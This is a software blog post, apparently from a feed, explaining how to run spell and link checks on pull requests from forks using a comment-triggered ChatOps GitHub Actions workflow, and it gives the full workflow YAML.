&lt;p&gt;This was determined to be intentional design by Github as a mitigation against the possibility that a bad actor could open PRs against your repo and do things like list out secrets or just run up a large bill (once we start charging) on your account.&lt;/p&gt;
&lt;p&gt;After speaking with &lt;a href="https://twitter.com/HamelHusain"&gt;Hamel Husain&lt;/a&gt; from Github on Twitter, he sent some great resources in the solution he found around this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://fastpages.fast.ai/actions/markdown/2020/03/06/fastpages-actions.html"&gt;Fastpages Actions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fastai/fastpages/blob/master/.github/workflows/chatops.yaml"&gt;Chatops.yaml&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actions/github-script#comment-on-an-issue"&gt;Github-Script&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Essentially, to take 'ownership' of the changes presented in a pull request, the owner (or authorized contributor) drops a comment with a specific command (eg, &lt;code&gt;/check-pr&lt;/code&gt;), which triggers an action. This workflow ended up like:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PR Submitted &amp;gt; Owner/Contributor comments keywords (eg &lt;code&gt;/check-pr&lt;/code&gt;) &amp;gt; Action triggers &amp;gt; Clones PR &amp;gt; Runs neccessary Actions &amp;gt; Comments back on PR results&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For the Awesome Python Bytes, the action to cover this workflow ended up as (&lt;a href="https://github.com/JackMcKew/awesome-python-bytes/blob/master/.github/workflows/chatops.yaml"&gt;source&lt;/a&gt;):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ensure to use &lt;code&gt;if: steps.prcomm.outputs.BOOL_TRIGGERED == 'true'&lt;/code&gt; in all subsequent jobs you want triggered if the phrase is found, otherwise the action will become recursive: check for comment, run checks, make a comment, check for comment, etc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table class="highlighttable table-striped table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Trigger Checks on Fork&lt;/span&gt;
&lt;span class="nt"&gt;on&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;issue_comment&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;

&lt;span class="nt"&gt;jobs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;label-pr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;runs-on&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;ubuntu-latest&lt;/span&gt;
    &lt;span class="nt"&gt;steps&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;listen for PR Comments&lt;/span&gt;
        &lt;span class="nt"&gt;uses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;machine-learning-apps/actions-chatops@master&lt;/span&gt;
        &lt;span class="nt"&gt;with&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;APP_PEM&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{ secrets.APP_PEM }}&lt;/span&gt;
          &lt;span class="nt"&gt;APP_ID&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{ secrets.APP_ID }}&lt;/span&gt;
          &lt;span class="nt"&gt;TRIGGER_PHRASE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;"/check-pr"&lt;/span&gt;
        &lt;span class="nt"&gt;env&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;# you must supply GITHUB_TOKEN&lt;/span&gt;
          &lt;span class="nt"&gt;GITHUB_TOKEN&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{ secrets.manual_github_token }}&lt;/span&gt;
        &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;prcomm&lt;/span&gt;
        &lt;span class="c1"&gt;# This step clones the branch of the PR associated with the triggering phrase, but only if it is triggered.&lt;/span&gt;
      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;clone branch of PR&lt;/span&gt;
        &lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;steps.prcomm.outputs.BOOL_TRIGGERED == 'true'&lt;/span&gt;
        &lt;span class="nt"&gt;uses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;actions/checkout@master&lt;/span&gt;
        &lt;span class="nt"&gt;with&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{ steps.prcomm.outputs.SHA }}&lt;/span&gt;

        &lt;span class="c1"&gt;# This step is a toy example that illustrates how you can use outputs from the pr-command action&lt;/span&gt;
      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;print variables&lt;/span&gt;
        &lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;steps.prcomm.outputs.BOOL_TRIGGERED == 'true'&lt;/span&gt;
        &lt;span class="nt"&gt;run&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;echo "${USERNAME} made a triggering comment on PR# ${PR_NUMBER} for ${BRANCH_NAME}"&lt;/span&gt;
        &lt;span class="nt"&gt;env&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;BRANCH_NAME&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{ steps.prcomm.outputs.BRANCH_NAME }}&lt;/span&gt;
          &lt;span class="nt"&gt;PR_NUMBER&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{ steps.prcomm.outputs.PULL_REQUEST_NUMBER }}&lt;/span&gt;
          &lt;span class="nt"&gt;USERNAME&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{ steps.prcomm.outputs.COMMENTER_USERNAME }}&lt;/span&gt;

      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Check Spelling&lt;/span&gt;
        &lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;steps.prcomm.outputs.BOOL_TRIGGERED == 'true'&lt;/span&gt;
        &lt;span class="nt"&gt;uses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;UnicornGlobal/spellcheck-github-actions@master&lt;/span&gt;

      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Link Checker&lt;/span&gt;
        &lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;steps.prcomm.outputs.BOOL_TRIGGERED == 'true'&lt;/span&gt;
        &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;lc&lt;/span&gt;
        &lt;span class="nt"&gt;uses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;peter-evans/link-checker@v1&lt;/span&gt;
        &lt;span class="nt"&gt;with&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;-v -r *&lt;/span&gt;
      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Fail if there were link errors&lt;/span&gt;
        &lt;span class="nt"&gt;run&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;exit ${{ steps.lc.outputs.exit_code }}&lt;/span&gt;

      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Comment on PR if checks pass&lt;/span&gt;
        &lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;success() &amp;amp;&amp;amp; steps.prcomm.outputs.BOOL_TRIGGERED == 'true'&lt;/span&gt;
        &lt;span class="nt"&gt;uses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;actions/github-script@0.9.0&lt;/span&gt;
        &lt;span class="nt"&gt;with&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;github-token&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{secrets.manual_github_token}}&lt;/span&gt;
          &lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;|&lt;/span&gt;
            &lt;span class="no"&gt;github.issues.createComment({&lt;/span&gt;
              &lt;span class="no"&gt;issue_number: context.issue.number,&lt;/span&gt;
              &lt;span class="no"&gt;owner: context.repo.owner,&lt;/span&gt;
              &lt;span class="no"&gt;repo: context.repo.repo,&lt;/span&gt;
              &lt;span class="no"&gt;body: 'ðŸ‘‹ All checks passed!'&lt;/span&gt;
            &lt;span class="no"&gt;})&lt;/span&gt;

      &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Comment on PR if checks fail&lt;/span&gt;
        &lt;span class="nt"&gt;if&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;failure() &amp;amp;&amp;amp; steps.prcomm.outputs.BOOL_TRIGGERED == 'true'&lt;/span&gt;
        &lt;span class="nt"&gt;uses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;actions/github-script@0.9.0&lt;/span&gt;
        &lt;span class="nt"&gt;with&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;github-token&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;${{secrets.manual_github_token}}&lt;/span&gt;
          &lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;|&lt;/span&gt;
            &lt;span class="no"&gt;github.issues.createComment({&lt;/span&gt;
              &lt;span class="no"&gt;issue_number: context.issue.number,&lt;/span&gt;
              &lt;span class="no"&gt;owner: context.repo.owner,&lt;/span&gt;
              &lt;span class="no"&gt;repo: context.repo.repo,&lt;/span&gt;
              &lt;span class="no"&gt;body: 'Some checks failled :(, check Github Actions for more details.'&lt;/span&gt;
            &lt;span class="no"&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="cicd"></category></entry></feed>